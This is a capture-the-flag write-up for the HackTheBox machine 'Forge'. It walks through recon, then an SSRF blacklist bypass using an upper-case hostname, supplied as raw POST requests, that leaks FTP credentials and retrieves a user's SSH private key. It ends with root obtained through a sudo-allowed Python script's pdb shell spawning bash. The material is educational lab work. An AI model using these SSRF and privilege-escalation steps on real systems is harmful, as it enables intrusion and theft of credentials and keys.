# HACKTHEBOX: Forge

Any unauthenticated attacker can abuse SSRF in the forge.htb/uploads website to gain access to an internal admin page containing FTP credentials. Abusing SSRF again allows the attacker to access a private SSH key.

## Recon and Enumeration

Running an `nmap` scan shows there is a filtered FTP server, an SSH server, and an HTTP server on port 80.
```
# Nmap 7.80 scan initiated Fri Sep 24 23:57:22 2021 as: nmap -A --min-rate 4000 -oA forge 10.10.11.111
Nmap scan report for 10.10.11.111
Host is up (0.060s latency).
Not shown: 997 closed ports
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open     http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 24 23:57:32 2021 -- 1 IP address (1 host up) scanned in 9.30 seconds
```

Visiting the web app in the web browser shows a url domain of http://forge.htb and running a gobuster vhost scan reveals another domain of http://admin.forge.htb
```
$ gobuster vhost --url http://forge.htb --wordlist /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o forge.vhost

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://forge.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/09/29 19:23:22 Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.forge.htb (Status: 200) [Size: 27]
```

Attempting to access http://admin.forge.htb shows that it is an internal site.
```
$ curl http://admin.forge.htb                       
Only localhost is allowed!
```

Attempting to access http://admin.forge.htb from http://forge.htb/upload returns an error `URL contains a blacklisted address!`
However, changing the url to upper case allows the attacker to view the admin page.
```
POST /upload HTTP/1.1
Host: forge.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Origin: http://forge.htb
DNT: 1
Connection: close
Referer: http://forge.htb/upload
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

url=http%3A%2F%2FADMIN.FORGE.HTB&remote=1
```

Returns an expected url `http://forge.htb/uploads/8gfhOTWUTgWmGrv9KhNN`. Curling this url contains the html for http://ADMIN.FORGE.HTB
```
$ curl http://forge.htb/uploads/8gfhOTWUTgWmGrv9KhNN

<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

## Exploitation and user.txt
The admin page has a `/announcements` channel and `/upload` page. Repeating the same process to read the `/announcements` reveals an ftp password.
```
POST /upload HTTP/1.1
Host: forge.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://forge.htb
DNT: 1
Connection: close
Referer: http://forge.htb/upload
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

url=http%3A%2F%2FADMIN.FORGE.HTB/announcements&remote=1
```

```
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

The `/announcements` reveal ftp creds `user:heightofsecurity123!` and additional functionality to `http://admin.forge.htb/uploads`. The admin uploads page allows for a `?u=<url>` option to accept FTP and FTPS along with HTTP and HTTPS.

The following POST request allows the attacker to retrive files via FTP. Here, the post request takes the private ssh key from the user.
```
POST /upload HTTP/1.1
Host: forge.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Origin: http://forge.htb
DNT: 1
Connection: close
Referer: http://forge.htb/upload
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

url=http%3A%2F%2FADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa&remote=1
```

```
$ wget http://forge.htb/uploads/Ad4NhdQB6R8RCkZMskro -O id_rsa

--2021-09-29 19:54:33--  http://forge.htb/uploads/Ad4NhdQB6R8RCkZMskro
Resolving forge.htb (forge.htb)... 10.10.11.111
Connecting to forge.htb (forge.htb)|10.10.11.111|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2590 (2.5K) [image/jpg]
Saving to: ‘id_rsa’

id_rsa                                   100%[=================================================================================>]   2.53K  --.-KB/s    in 0s      

2021-09-29 19:54:33 (127 MB/s) - ‘id_rsa’ saved [2590/2590]
```

The attacker can now connect via SSH using id_rsa.
```
$ chmod 400 id_rsa
$ ssh user@10.10.11.111 -i id_rsa
user@forge:~$
```

## Privilege Escalation and root.txt
Running `sudo -l` reveals the user can run a python script as root without a password.
```
user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
user@forge:~$
```

Running the python script with sudo shows that it listens for a port. When it recieves unexpected input, it drops a python debugging shell. tmux can be used to create multiple windows. One tmux window will be used to run the python script, and the other tmux window will be used to connect via netcat.

```
# tmux window one

user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:24112
```

```
# tmux window two
user@forge:~$ nc 127.0.0.1 24112
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
foobarbaz
```

After `foobarbaz` was entered, a python debug shell was opened in tmux window one. Here, the attacker can run arbitrary python commands. This will be used to drop a bash shell as root.
```
# tmux window one

user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:24112
invalid literal for int() with base 10: b'foobarbaz'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) __import__('pty').spawn('/bin/bash')
root@forge:/home/user# whoami
root
root@forge:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@forge:/home/user#
```
